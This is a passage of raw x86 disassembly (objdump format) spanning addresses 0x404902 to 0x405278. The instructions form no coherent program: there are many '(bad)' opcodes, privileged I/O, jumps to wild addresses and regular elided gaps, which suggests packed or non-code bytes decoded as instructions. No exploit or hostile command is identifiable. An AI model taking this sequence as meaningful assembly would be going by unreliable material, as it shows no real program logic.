  404902:	lds    esi,FWORD PTR [edi-0x335bf20c]
  404908:	in     eax,0x4c
  40490a:	(bad)  
  40490b:	test   eax,0x0
	...
  404924:	add    BYTE PTR [esi],dl
  404926:	mov    esi,ss
  404928:	mov    ds:0x6883cb47,al
  40492d:	xor    DWORD PTR [ecx],edi
  40492f:	mov    ah,BYTE PTR [ebx+0x18]
  404932:	cli    
  404933:	pusha  
  404934:	jbe    0x4048f9
  404936:	mov    dh,0x58
  404938:	(bad)  
  404939:	jmp    0x2634:0x8ccc4777
  404940:	mov    bh,0x9d
  404942:	cmc    
  404943:	add    al,0xa2
  404945:	pop    esi
  404946:	mov    dl,0x14
  404948:	test   eax,0x217b732f
  40494d:	sub    eax,DWORD PTR [eax-0x6e]
  404950:	sub    dl,BYTE PTR [edx+0x1]
  404953:	add    BYTE PTR [ecx-0x6f21a64d],ch
  404959:	add    BYTE PTR [ecx-0xcfa0061],cl
  40495f:	push   edi
  404960:	out    dx,al
  404961:	sub    al,0xe2
  404963:	sbb    BYTE PTR ds:0xcda2f40,cl
  404969:	adc    eax,DWORD PTR [ebx+ebx*4+0x4c]
  40496d:	push   ebp
  40496e:	sub    esp,DWORD PTR [edi-0x19c5a1c3]
  404974:	push   ds
  404975:	xor    ecx,DWORD PTR ds:0xdc401f25
  40497b:	arpl   ax,bp
  40497d:	push   0x7a01a36f
  404982:	jle    0x404966
  404984:	fimul  DWORD PTR [esi-0x2f]
  404987:	and    ebx,eax
	...
  4049a1:	add    BYTE PTR [ebx],bh
  4049a3:	mov    al,ds:0xa5dc5460
  4049a8:	scas   eax,DWORD PTR es:[edi]
  4049a9:	xor    eax,0x56eeced7
  4049ae:	retf   0x2d83
  4049b1:	addr16 jmp 0x4070b609
  4049b7:	jmp    0xf8238366
  4049bc:	jmp    0x29872013
  4049c1:	dec    ebx
  4049c2:	int    0x15
  4049c4:	push   0xf61d9716
  4049c9:	not    DWORD PTR [ebx-0xf2b48ba]
  4049cf:	stc    
  4049d0:	jae    0x4049b7
  4049d2:	sub    esp,0x612ab234
  4049d8:	repnz mov ebx,0x90b38fbf
  4049de:	or     al,0xbf
  4049e0:	jo     0x40496b
  4049e2:	adc    eax,0x20031ae
  4049e7:	imul   esi,ebx,0xfffffffe
  4049ea:	dec    ebx
  4049eb:	gs ret 0xe0bf
  4049ef:	pop    eax
  4049f0:	xchg   ecx,eax
  4049f1:	jl     0x4049cc
  4049f3:	int    0xa0
  4049f5:	cmp    eax,0xfa368f9e
  4049fa:	ja     0x404a15
  4049fc:	pop    es
  4049fd:	mov    ebx,0x78543e7c
  404a02:	jne    0x404a2f
  404a04:	cmp    DWORD PTR gs:[eax],eax
	...
  404a1f:	test   BYTE PTR [ebp+0x20ff4b98],0xa9
  404a26:	or     dl,BYTE PTR [edi*1+0x141dc9fa]
  404a2d:	retf   
  404a2e:	mov    BYTE PTR [edx],bh
  404a30:	push   edx
  404a31:	pop    ebp
  404a32:	dec    edi
  404a33:	adc    edi,DWORD PTR [ebp+0x6c]
  404a36:	push   cs
  404a37:	clc    
  404a38:	pop    edi
  404a39:	aas    
  404a3a:	int    0x1
  404a3c:	(bad)  
  404a3d:	push   cs
  404a3e:	mov    WORD PTR [esi-0x20],cs
  404a41:	adc    DWORD PTR [ebx+0x67],eax
  404a44:	dec    eax
  404a45:	and    eax,DWORD PTR [edx]
  404a47:	mov    ebp,gs
  404a49:	outs   dx,DWORD PTR ds:[esi]
  404a4a:	shl    DWORD PTR [ebp-0x6],0x40
  404a4e:	xor    BYTE PTR [edx],0xbc
  404a51:	(bad)  
  404a52:	inc    edi
  404a53:	sbb    edx,DWORD PTR [ebp+0x17006e5]
  404a59:	mov    ch,0xc5
  404a5b:	imul   ebx,DWORD PTR [esi+0x484c8483],0xdfa51a8a
  404a65:	mov    edx,0xe7fa4e5b
  404a6a:	cwde   
  404a6b:	addr16 in eax,dx
  404a6d:	fcomp  st(1)
  404a6f:	jo     0x404a05
  404a71:	dec    esi
  404a72:	push   ds
  404a73:	pop    ecx
  404a74:	mov    ebx,0xcef45f7d
  404a79:	(bad)  
  404a7a:	sub    al,0x78
  404a7c:	int    0x3
  404a7e:	sbb    al,0x31
  404a80:	inc    esp
  404a81:	jnp    0x404a83
	...
  404a9b:	add    dh,ah
  404a9d:	dec    ebx
  404a9e:	xchg   BYTE PTR [ecx],dh
  404aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aa1:	and    dh,BYTE PTR [ecx+0x62]
  404aa4:	cmp    DWORD PTR fs:[eax+0x53],ebx
  404aa8:	inc    ebp
  404aa9:	enter  0xc598,0x2
  404aad:	push   0xc6cbf4b1
  404ab2:	(bad)  
  404ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab4:	xor    BYTE PTR [ebp+0x752996bb],0x9
  404abb:	mov    esp,0x8d00161d
  404ac0:	dec    esp
  404ac1:	aaa    
  404ac2:	rcr    ebp,cl
  404ac4:	(bad)
  404ac8:	push   ds
  404ac9:	pop    eax
  404aca:	sub    eax,0x145fd979
  404acf:	dec    eax
  404ad0:	nop
  404ad1:	jbe    0x404b12
  404ad3:	sbb    ecx,DWORD PTR [ebx-0x73]
  404ad6:	dec    edx
  404ad7:	sub    ah,BYTE PTR [edx]
  404ad9:	or     al,0xc2
  404adb:	ss aad 0x9b
  404ade:	mov    BYTE PTR [edi],0x94
  404ae1:	cli    
  404ae2:	stos   DWORD PTR es:[edi],eax
  404ae3:	push   esp
  404ae4:	push   edi
  404ae5:	stc    
  404ae6:	xchg   esp,eax
  404ae7:	gs (bad) 
  404ae9:	scas   eax,DWORD PTR es:[edi]
  404aea:	push   ebp
  404aeb:	repz xchg ecx,eax
  404aed:	pop    es
  404aee:	imul   eax,edx,0x58
  404af1:	inc    BYTE PTR [edi-0x7efaec6f]
  404af7:	mov    al,ds:0xaec749da
  404afc:	dec    esp
  404afd:	fld    st(1)
  404aff:	lahf   
	...
  404b18:	add    BYTE PTR [ebp-0x4],bh
  404b1b:	xchg   esp,eax
  404b1c:	int3   
  404b1d:	mov    esi,0xeffdabfa
  404b22:	add    al,0x69
  404b24:	imul   ebx,edi,0x58
  404b27:	adc    BYTE PTR [esi-0x42],0x99
  404b2b:	pop    ebx
  404b2c:	sub    ebp,0xc8841da
  404b32:	sbb    al,0xd5
  404b34:	call   DWORD PTR [edi]
  404b36:	push   ebp
  404b37:	mov    ah,0x8
  404b39:	jmp    0xb22e22d3
  404b3e:	(bad)  
  404b3f:	in     eax,0xd2
  404b41:	stos   BYTE PTR es:[edi],al
  404b42:	pop    ss
  404b43:	xor    DWORD PTR [edx*1+0x442d3851],edx
  404b4a:	xchg   edx,eax
  404b4b:	push   ebx
  404b4c:	dec    edx
  404b4d:	ja     0x404b22
  404b4f:	dec    ecx
  404b50:	aas    
  404b51:	inc    esi
  404b52:	adc    al,0xb2
  404b54:	popf   
  404b55:	and    ecx,DWORD PTR [ebx-0x65]
  404b58:	mov    ds:0xcfb00c1a,al
  404b5d:	inc    ecx
  404b5e:	leave  
  404b5f:	leave  
  404b60:	mov    eax,0x79568978
  404b65:	push   es
  404b66:	dec    edi
  404b67:	push   edi
  404b68:	mov    ss,WORD PTR [edi]
  404b6a:	adc    BYTE PTR [ebx+eiz*2+0x64],dh
  404b6e:	int    0x65
  404b70:	pop    esp
  404b71:	xor    eax,0x28e4ea8e
  404b76:	inc    ebx
  404b77:	jecxz  0x404b54
  404b79:	dec    edi
  404b7a:	add    al,0xb8
  404b7c:	test   BYTE PTR [eax],0x0
	...
  404b93:	add    BYTE PTR [eax],al
  404b95:	add    dl,bh
  404b97:	rol    cl,0x11
  404b9a:	add    al,BYTE PTR [edx+0x468c50ce]
  404ba0:	fbstp  TBYTE PTR [edi]
  404ba2:	dec    ebp
  404ba3:	pop    es
  404ba4:	mov    esp,0x9dc49e1a
  404ba9:	and    eax,0xdb6885bf
  404bae:	mov    al,0xfb
  404bb0:	pusha  
  404bb1:	in     al,0x87
  404bb3:	cmp    al,BYTE PTR [eax]
  404bb5:	jp     0x404b9c
  404bb7:	arpl   WORD PTR [ebp-0x238e957d],bx
  404bbd:	or     al,0x23
  404bbf:	add    eax,0xd5c41d1b
  404bc4:	pop    ecx
  404bc5:	adc    DWORD PTR ds:[edi],esp
  404bc8:	cdq    
  404bc9:	pop    ds
  404bca:	out    dx,al
  404bcb:	aaa    
  404bcc:	fdiv   DWORD PTR [eax-0x66e8b46a]
  404bd2:	popa   
  404bd3:	sbb    dl,BYTE PTR [esi+0x72]
  404bd6:	jl     0x404bc1
  404bd8:	xchg   esp,eax
  404bd9:	mov    eax,DWORD PTR [ebx-0x8]
  404bdc:	rcl    DWORD PTR [eax*4-0x55eaec72],cl
  404be3:	pop    edi
  404be4:	push   edx
  404be5:	idiv   BYTE PTR [esi-0x68186e54]
  404beb:	mov    ebp,0x97ea27d0
  404bf0:	in     al,dx
  404bf1:	es int 0xc6
  404bf4:	lods   eax,DWORD PTR ds:[esi]
  404bf5:	inc    ebp
  404bf6:	test   al,0x75
  404bf8:	outs   dx,BYTE PTR ds:[esi]
  404bf9:	xor    al,0x0
	...
  404c13:	daa    
  404c14:	gs das 
  404c16:	jecxz  0x404bfd
  404c18:	shl    bh,1
  404c1a:	retf   0x1f0
  404c1d:	test   eax,0x6a36d3e1
  404c22:	clc    
  404c23:	mov    dl,0x21
  404c25:	sub    ebx,DWORD PTR [edi+0x53]
  404c28:	sbb    al,0xe4
  404c2a:	outs   dx,BYTE PTR ds:[esi]
  404c2b:	push   esp
  404c2c:	dec    ebp
  404c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2e:	dec    ebp
  404c2f:	inc    ecx
  404c30:	(bad)  
  404c31:	gs sub al,0x7e
  404c34:	out    dx,eax
  404c35:	es pop ebx
  404c37:	mov    edi,0x6852e059
  404c3c:	mov    BYTE PTR [ecx+0x62bb5529],ah
  404c42:	xor    BYTE PTR [edx-0x56],bl
  404c45:	and    eax,DWORD PTR [eax]
  404c47:	test   eax,0x90bde13a
  404c4c:	and    edx,eax
  404c4e:	cld    
  404c4f:	jmp    0x404bdf
  404c51:	cmp    DWORD PTR [edi],0x62
  404c54:	adc    DWORD PTR [edx+0x24568d7e],esi
  404c5a:	mov    ecx,0xf815cf84
  404c5f:	(bad)  
  404c60:	pusha  
  404c61:	inc    esi
  404c62:	cmp    eax,DWORD PTR [esi+0x117a7765]
  404c68:	in     al,dx
  404c69:	push   0xffffffb5
  404c6b:	sbb    bl,bh
  404c6d:	pop    ecx
  404c6e:	hlt    
  404c6f:	repz aad 0x8
  404c72:	aaa    
  404c73:	sub    cl,BYTE PTR [esi+0x38]
  404c76:	jbe    0x404c78
	...
  404c90:	push   ebp
  404c91:	or     DWORD PTR [esi-0x616b934f],ebp
  404c97:	lock xchg edi,eax
  404c99:	mov    edx,0xa18e33cb
  404c9e:	cld    
  404c9f:	jb     0x404cbe
  404ca1:	push   es
  404ca2:	add    BYTE PTR [eax],al
  404ca4:	or     al,0xc4
  404ca6:	push   0x37
  404ca8:	push   cs
  404ca9:	adc    ah,0x6e
  404cac:	fistp  QWORD PTR [edi]
  404cae:	mov    esi,0xa808da59
  404cb3:	(bad)  
  404cb5:	into   
  404cb6:	ret    0xc9eb
  404cb9:	je     0x404d37
  404cbb:	mov    dl,0xd8
  404cbd:	dec    edx
  404cbe:	push   ss
  404cbf:	test   ebx,eax
  404cc1:	xchg   esi,eax
  404cc2:	push   eax
  404cc3:	mov    eax,0x8f3b50d2
  404cc8:	rcl    BYTE PTR [edx],1
  404cca:	test   esi,edx
  404ccc:	rcr    esp,1
  404cce:	out    dx,al
  404ccf:	loope  0x404c75
  404cd1:	fwait
  404cd2:	clc    
  404cd3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404cd5:	pop    ebp
  404cd6:	xchg   ebx,eax
  404cd7:	push   ebx
  404cd8:	hlt    
  404cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cda:	jge    0x404d09
  404cdc:	(bad)  
  404cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cde:	aas    
  404cdf:	inc    edi
  404ce0:	leave  
  404ce1:	lahf   
  404ce2:	in     eax,0xa2
  404ce4:	add    al,0xb9
  404ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce7:	leave  
  404ce8:	xor    esi,DWORD PTR [ebx-0x35ed889f]
  404cee:	and    ebx,DWORD PTR ds:0xaef071d
	...
  404d0c:	add    BYTE PTR [eax+0x7f61b105],dl
  404d12:	xchg   ebx,eax
  404d13:	push   0xffffffdf
  404d15:	ss xchg esp,eax
  404d17:	sub    al,0xb5
  404d19:	inc    ecx
  404d1a:	mov    ebp,0xbe2cf1d8
  404d1f:	xchg   esi,eax
  404d20:	cwde   
  404d21:	cmp    edi,DWORD PTR [esp+edx*2+0x12bb5a26]
  404d28:	dec    esp
  404d29:	test   DWORD PTR [eax-0x6ff7a621],ebx
  404d2f:	popf   
  404d30:	xor    bh,dl
  404d32:	cdq    
  404d33:	pop    ebx
  404d34:	mov    cs,WORD PTR [esi-0x461be66e]
  404d3a:	add    ecx,DWORD PTR [edi+0x46]
  404d3d:	adc    al,0x4
  404d3f:	lea    ebp,[ebx+eiz*1]
  404d42:	xchg   esi,eax
  404d43:	retf   0x8292
  404d46:	xchg   esp,eax
  404d47:	or     al,bh
  404d49:	lods   eax,DWORD PTR ds:[esi]
  404d4a:	lahf   
  404d4b:	inc    edi
  404d4c:	out    dx,al
  404d4d:	and    BYTE PTR [eax-0x4e107b7b],bh
  404d53:	ret    
  404d54:	cmp    ah,BYTE PTR [esi]
  404d56:	leave  
  404d57:	add    DWORD PTR [eax+0x51],edx
  404d5a:	pop    eax
  404d5b:	cmp    eax,0x7f4f1c17
  404d60:	jge    0x404dad
  404d62:	pop    ecx
  404d63:	mov    ecx,0xfb51eac3
  404d68:	test   al,0xf5
  404d6a:	add    al,0x18
  404d6c:	xor    eax,0x77198163
	...
  404d89:	add    cl,al
  404d8b:	push   esp
  404d8c:	sbb    esi,DWORD PTR [ecx-0xce554e1]
  404d92:	hlt    
  404d93:	mov    ecx,0x7599290d
  404d98:	add    al,0x6b
  404d9a:	imul   esp,DWORD PTR [eax+0xe],0xffffffad
  404d9e:	and    eax,0xceef0797
  404da3:	int    0xca
  404da5:	and    DWORD PTR [ecx+0x1363cb48],esi
  404dab:	sbb    al,0xc9
  404dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dae:	ins    DWORD PTR es:[edi],dx
  404daf:	jecxz  0x404d78
  404db1:	out    0x46,eax
  404db3:	repnz rcr BYTE PTR [ebx],cl
  404db6:	mov    ch,ch
  404db8:	rcr    DWORD PTR [ecx+0x1a],1
  404dbb:	clc    
  404dbc:	mov    edi,0xc13e949f
  404dc1:	(bad)  
  404dc3:	adc    eax,0x91001314
  404dc8:	or     eax,0x7c3a251
  404dcd:	xchg   edi,eax
  404dce:	cmp    al,0x7b
  404dd0:	(bad)  
  404dd1:	aam    0x55
  404dd3:	push   0x39
  404dd5:	jp     0x404e48
  404dd7:	lds    edi,FWORD PTR [eax]
  404dd9:	cmp    al,0x13
  404ddb:	nop
  404ddc:	cmp    bh,dh
  404dde:	dec    esp
  404ddf:	addr16 cmp eax,eax
  404de2:	daa    
  404de3:	jle    0x404e03
  404de5:	jno    0x404e00
  404de7:	stc    
  404de8:	push   ss
  404de9:	xor    ebp,DWORD PTR [ebx]
  404deb:	in     al,dx
  404dec:	sbb    al,0xf5
	...
  404e06:	add    ah,al
  404e08:	adc    dl,BYTE PTR [edi+esi*4]
  404e0b:	outs   dx,DWORD PTR ds:[esi]
  404e0c:	inc    ecx
  404e0d:	pop    es
  404e0e:	mov    esp,DWORD PTR [eax-0x7db701e4]
  404e14:	inc    edi
  404e15:	add    ah,dh
  404e17:	add    cl,BYTE PTR ds:0x22b8ed16
  404e1d:	and    eax,esp
  404e1f:	ja     0x404e31
  404e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e22:	loope  0x404e59
  404e24:	not    DWORD PTR [edx-0x359b042d]
  404e2a:	shl    BYTE PTR [ecx+0x23d5fdca],cl
  404e30:	out    0xaf,eax
  404e32:	int3   
  404e33:	fld    DWORD PTR [eax-0x79]
  404e36:	(bad)  
  404e37:	dec    edi
  404e38:	popf   
  404e39:	fidivr WORD PTR [edi-0x6d168b73]
  404e3f:	retf   0x6c7e
  404e42:	xchg   ebx,eax
  404e43:	add    BYTE PTR [ecx+0x3526815b],ch
  404e49:	add    al,BYTE PTR [eax-0x74cb239c]
  404e4f:	rcl    BYTE PTR [edi],1
  404e51:	or     BYTE PTR [edx-0x77c10df6],cl
  404e57:	sbb    al,0x6a
  404e59:	mov    WORD PTR [esi-0x3b],bx
  404e5d:	push   ecx
  404e5e:	dec    esp
  404e5f:	xchg   esi,eax
  404e60:	scas   eax,DWORD PTR es:[edi]
  404e61:	aam    0x45
  404e63:	aam    0x59
  404e65:	jecxz  0x404eb6
  404e67:	sbb    al,BYTE PTR [edx]
  404e69:	mov    edx,0x46
	...
  404e82:	add    BYTE PTR [eax],al
  404e84:	push   eax
  404e85:	sub    eax,0xcb47318d
  404e8a:	and    BYTE PTR [eax],dh
  404e8c:	add    eax,0x2b221764
  404e91:	test   BYTE PTR [ebp+0x23],0x61
  404e95:	adc    BYTE PTR [ecx+0x36],bh
  404e98:	sahf   
  404e99:	and    bh,ah
  404e9b:	das    
  404e9c:	fmul   QWORD PTR ds:0x4e1225cb
  404ea2:	xchg   edx,eax
  404ea3:	sbb    al,0x48
  404ea5:	mov    eax,0xc51300a5
  404eaa:	call   0xe0af:0xf0031298
  404eb1:	inc    eax
  404eb2:	dec    esi
  404eb3:	not    cl
  404eb5:	jle    0x404edb
  404eb7:	ror    DWORD PTR [ebp+ecx*8+0x32],0x44
  404ebc:	dec    ebp
  404ebd:	or     ebx,DWORD PTR [eax+0x73]
  404ec0:	pop    edi
  404ec1:	dec    ecx
  404ec2:	out    0x2a,al
  404ec4:	pop    esi
  404ec5:	xchg   DWORD PTR [ebp+ebx*1+0x50687161],ecx
  404ecc:	pusha  
  404ecd:	scas   eax,DWORD PTR es:[edi]
  404ece:	add    DWORD PTR [edi-0x6e],esp
  404ed1:	cmc    
  404ed2:	mov    ebx,0xd633833e
  404ed7:	or     DWORD PTR [esi-0x60733f86],ebx
  404edd:	mov    eax,0xee8dbba9
  404ee2:	adc    esp,edx
  404ee4:	mov    WORD PTR [esi+edi*2],?
  404ee7:	aad    0x0
	...
  404f01:	xchg   edi,eax
  404f02:	pusha  
  404f03:	cmp    eax,ebp
  404f05:	xchg   esi,eax
  404f06:	mov    ds:0xe484df52,al
  404f0b:	in     al,dx
  404f0c:	xchg   BYTE PTR [ebp-0x474e78ca],al
  404f12:	gs xchg ecx,eax
  404f14:	xor    al,0xd9
  404f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f17:	cli    
  404f18:	add    ecx,ebx
  404f1a:	jmp    0x2c1aa963
  404f1f:	das    
  404f20:	ins    DWORD PTR es:[edi],dx
  404f21:	sub    al,0xb5
  404f23:	sbb    al,BYTE PTR [eax-0x488e8cd3]
  404f29:	mov    edi,0xbeeecf30
  404f2e:	out    dx,al
  404f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f30:	fnstenv [ebx-0x53]
  404f33:	mov    dl,0x5c
  404f35:	jb     0x404fb2
  404f37:	fldcw  WORD PTR [ebx-0xc]
  404f3a:	mov    BYTE PTR [ebx+0x67],bl
  404f3d:	push   es
  404f3e:	sbb    BYTE PTR ds:0xe16ef90d,0x49
  404f45:	cld    
  404f46:	test   DWORD PTR [edi+0x65800320],ebx
  404f4c:	sahf   
  404f4d:	inc    edx
  404f4e:	sbb    DWORD PTR [ebx],esp
  404f50:	hlt    
  404f51:	adc    eax,0x90e1ea34
  404f56:	xor    al,0xa8
  404f58:	mov    BYTE PTR [edi+0x7e366e42],ah
  404f5e:	inc    ecx
  404f5f:	sub    al,0x5c
  404f61:	inc    ecx
  404f62:	inc    eax
  404f63:	div    BYTE PTR [edi+0x0]
	...
  404f7d:	add    BYTE PTR [edi+edx*8-0x32c42d4d],al
  404f84:	jno    0x404ff2
  404f86:	mov    ah,dh
  404f88:	das    
  404f89:	push   es
  404f8a:	(bad)  
  404f8b:	loope  0x404f89
  404f8d:	invd   
  404f8f:	jecxz  0x404f4b
  404f91:	jp     0x404f82
  404f93:	hlt    
  404f94:	js     0x404f5a
  404f96:	mov    dh,0xf3
  404f98:	ss scas al,BYTE PTR es:[edi]
  404f9a:	leave  
  404f9b:	call   0x83c4:0x99ace902
  404fa2:	mov    bl,0x9b
  404fa4:	jle    0x404fe3
  404fa6:	rcr    BYTE PTR [eax+eax*2+0xbb80557],cl
  404fad:	inc    ecx
  404fae:	xor    BYTE PTR [eax-0x49a8d433],0x87
  404fb5:	xchg   ebp,eax
  404fb6:	push   cs
  404fb7:	lods   eax,DWORD PTR ds:[esi]
  404fb8:	dec    ecx
  404fb9:	push   DWORD PTR [ecx]
  404fbb:	fs sbb al,0x5d
  404fbe:	xchg   esp,eax
  404fbf:	arpl   WORD PTR [esi+0x37],bx
  404fc2:	dec    ebx
  404fc3:	js     0x404f5d
  404fc5:	mov    edx,edi
  404fc7:	jbe    0x404fa3
  404fc9:	loop   0x404fe8
  404fcb:	add    eax,0x51e113c7
  404fd0:	mov    esi,0xb4807355
  404fd5:	(bad)  
  404fd6:	adc    eax,0x2ed1adb7
  404fdb:	stos   BYTE PTR es:[edi],al
  404fdc:	sahf   
  404fdd:	sub    eax,0x6b97ace8
	...
  404ffa:	add    BYTE PTR [edx],bl
  404ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffd:	popf   
  404ffe:	test   eax,0xe7945bcc
  405003:	xchg   BYTE PTR gs:[ecx],bh
  405006:	es push eax
  405008:	or     DWORD PTR [eax],edi
  40500a:	fs ret 0x39d8
  40500e:	mov    ds:0xe03b1f04,al
  405013:	fnsave [ecx]
  405015:	sub    al,0x3a
  405017:	jp     0x40500e
  405019:	and    al,0x78
  40501b:	mov    ah,ch
  40501d:	cs mov esi,0xfc26131e
  405023:	and    edi,DWORD PTR [esi]
  405025:	sub    esi,DWORD PTR [ecx]
  405027:	ret    0x2ac0
  40502a:	outs   dx,DWORD PTR ds:[esi]
  40502b:	adc    BYTE PTR [eax+0x6776b528],dl
  405031:	sub    ebx,esi
  405033:	pop    ebx
  405034:	jp     0x405068
  405036:	inc    edi
  405037:	mov    ebx,DWORD PTR [ebp+0x33]
  40503a:	mov    DWORD PTR [ecx],edi
  40503c:	je     0x40505f
  40503e:	retf   
  40503f:	scas   eax,DWORD PTR es:[edi]
  405040:	retf   0xd20
  405043:	add    eax,0xf33fb596
  405048:	sbb    BYTE PTR [ecx+eax*4-0x3c59b85f],ch
  40504f:	daa    
  405050:	out    dx,eax
  405051:	sahf   
  405052:	add    eax,0x6857e23d
  405057:	bound  eax,QWORD PTR [ebp+0x59]
  40505a:	lock sbb eax,DWORD PTR es:[eax]
  40505e:	pop    ebx
	...
  405077:	add    al,bl
  405079:	inc    ebp
  40507a:	cs pop edx
  40507c:	mov    ds,esp
  40507e:	sbb    BYTE PTR [edi+0x55],bh
  405081:	rcr    DWORD PTR [ebx-0x54c70c8a],cl
  405087:	jl     0x40505a
  405089:	popf   
  40508a:	bnd jne 0x405024
  40508d:	test   ch,al
  40508f:	and    cx,sp
  405092:	clc    
  405093:	pop    edi
  405094:	or     eax,0xcf55cf62
  405099:	not    BYTE PTR [ebp-0x5ef27eb4]
  40509f:	sub    DWORD PTR [edx],0xe4802424
  4050a5:	or     DWORD PTR [ebx],edx
  4050a7:	jb     0x40504f
  4050a9:	dec    esi
  4050aa:	dec    edx
  4050ab:	jae    0x405115
  4050ad:	mov    ch,0x7d
  4050af:	je     0x40511f
  4050b1:	fldcw  WORD PTR [edi]
  4050b3:	ins    DWORD PTR es:[edi],dx
  4050b4:	shl    BYTE PTR [ebx],0x7
  4050b7:	repnz movs DWORD PTR es:[di],DWORD PTR ds:[si]
  4050ba:	pop    esi
  4050bb:	pop    esi
  4050bc:	sub    al,0x7f
  4050be:	imul   esi,DWORD PTR [ebx+0x77],0xb972ec71
  4050c5:	(bad)  [eax+0x4b]
  4050c9:	cmp    al,0x82
  4050cb:	popa   
  4050cc:	xor    eax,0xb96ab4e7
  4050d1:	sub    BYTE PTR [eax-0x40fd1095],cl
  4050d7:	imul   ebp,DWORD PTR ds:0x68e663,0x0
	...
  4050f5:	imul   ebp,DWORD PTR [esi-0x3f58922f],0x54
  4050fc:	fs leave 
  4050fe:	push   0x63
  405100:	outs   dx,BYTE PTR ds:[esi]
  405101:	sbb    edi,ebx
  405103:	cmp    DWORD PTR [edi+0x45],esp
  405106:	push   ss
  405107:	or     eax,0xd0666400
  40510c:	mov    al,ds:0x97b9a985
  405111:	ja     0x405106
  405113:	add    ecx,esi
  405115:	jbe    0x40513c
  405117:	outs   dx,BYTE PTR ds:[esi]
  405118:	stc    
  405119:	inc    ebx
  40511a:	pop    esi
  40511b:	js     0x405199
  40511d:	inc    edx
  40511e:	mov    al,ds:0xea304b11
  405123:	stos   DWORD PTR es:[edi],eax
  405124:	adc    al,BYTE PTR [ecx]
  405126:	sbb    al,0xc6
  405128:	and    eax,0x1881782a
  40512d:	cmp    esi,DWORD PTR [esi-0xbc6d016]
  405133:	push   esp
  405134:	jbe    0x40516e
  405136:	inc    edx
  405137:	aas    
  405138:	inc    ecx
  405139:	ins    DWORD PTR es:[edi],dx
  40513a:	jno    0x405165
  40513c:	les    edi,FWORD PTR [edi+ebp*4+0x42]
  405140:	repz jle 0x405130
  405143:	cld    
  405144:	stos   BYTE PTR es:[edi],al
  405145:	outs   dx,DWORD PTR ds:[esi]
  405146:	cmp    edx,DWORD PTR [edi+0x73c4f89d]
  40514c:	shr    cl,1
  40514e:	xchg   edx,eax
  40514f:	sbb    bh,ah
  405151:	jmp    0x40519b
  405153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405154:	mov    esi,0x89cd86ea
	...
  405171:	add    BYTE PTR [edi-0x51f32445],bh
  405177:	or     DWORD PTR [ecx+0xf3fac3b],esi
  40517d:	bound  ebx,QWORD PTR [ebp-0x49aa9a83]
  405183:	popa   
  405184:	and    ch,BYTE PTR [eax-0x49]
  405187:	xchg   ebx,eax
  405188:	inc    edi
  405189:	pop    edi
  40518a:	in     eax,0xd5
  40518c:	cmc    
  40518d:	push   es
  40518e:	in     al,0x17
  405190:	pushf  
  405191:	xor    DWORD PTR [ecx+0x58],edx
  405194:	mov    dh,BYTE PTR [eax+esi*2-0xb7c2066]
  40519b:	jp     0x4051d6
  40519d:	pop    esi
  40519e:	push   ds
  40519f:	cmp    BYTE PTR [ebx+0x34],0x9
  4051a3:	pushf  
  4051a4:	add    eax,DWORD PTR [eax]
  4051a6:	hlt    
  4051a7:	adc    DWORD PTR [edi+0x67],0x51
  4051ab:	xchg   BYTE PTR [eax+ecx*8],cl
  4051ae:	outs   dx,DWORD PTR ds:[esi]
  4051af:	lods   eax,DWORD PTR ds:[esi]
  4051b0:	push   eax
  4051b1:	scas   eax,DWORD PTR es:[edi]
  4051b2:	retf   0x211a
  4051b5:	xchg   edi,eax
  4051b6:	sub    edi,DWORD PTR [ebx-0x3ef90f4b]
  4051bc:	sub    bl,BYTE PTR [edi-0x60]
  4051bf:	and    BYTE PTR [esi+0x4f607d38],ch
  4051c5:	sub    BYTE PTR [ebx+0x7e4f0b90],ah
  4051cb:	or     bl,BYTE PTR [ecx-0x20]
  4051ce:	sbb    BYTE PTR [ebx+0x4],bh
  4051d1:	xchg   ebp,esi
  4051d3:	push   ebp
  4051d4:	lods   eax,DWORD PTR ds:[esi]
  4051d5:	mov    edi,0x0
	...
  4051ee:	add    BYTE PTR [ebp+ebp*1+0x29],cl
  4051f2:	fsubr  DWORD PTR [ecx-0x388849c5]
  4051f8:	push   ebx
  4051f9:	and    dl,BYTE PTR [eax]
  4051fb:	and    ch,BYTE PTR [esp+edi*8+0x56]
  4051ff:	xchg   ebx,eax
  405200:	xor    esp,DWORD PTR [eax+0x30]
  405203:	outs   dx,BYTE PTR ds:[esi]
  405204:	aad    0xf2
  405206:	sahf   
  405207:	or     BYTE PTR [esi+0x67],bl
  40520a:	clc    
  40520b:	in     eax,0x4a
  40520d:	sbb    al,al
  40520f:	cmp    al,0x8a
  405211:	mov    esi,0x117099a7
  405216:	or     BYTE PTR [edi+0x126fc4f0],dh
  40521c:	xor    DWORD PTR [eax+0x7f],ebp
  40521f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405220:	shl    ah,0x17
  405223:	add    DWORD PTR [ebx+0x5f],ebx
  405226:	mov    bh,0x1f
  405228:	sub    bh,bl
  40522a:	iret   
  40522b:	jp     0x405231
  40522d:	add    eax,ebp
  40522f:	sbb    al,0xe9
  405231:	mov    dl,BYTE PTR [ecx]
  405233:	jnp    0x40527b
  405235:	cdq    
  405236:	mov    esi,0x19e160d4
  40523b:	mov    bl,0xbb
  40523d:	mov    edx,edx
  40523f:	mov    ds:0xbc85e0cf,al
  405244:	sub    al,0xe3
  405246:	fcomp  DWORD PTR [edx+0x5a]
  405249:	jnp    0x4052c8
  40524b:	hlt    
  40524c:	mov    ah,0xd6
  40524e:	xor    ecx,DWORD PTR [esi+ebx*1]
  405251:	jbe    0x4051fb
	...
  40526b:	add    BYTE PTR [ebx],ch
  40526d:	add    DWORD PTR [ebx+edi*1-0x3c],ebp
  405271:	mov    ds:0x88639ecc,eax
  405276:	or     al,0x7e
  405278:	jnp    0x405230
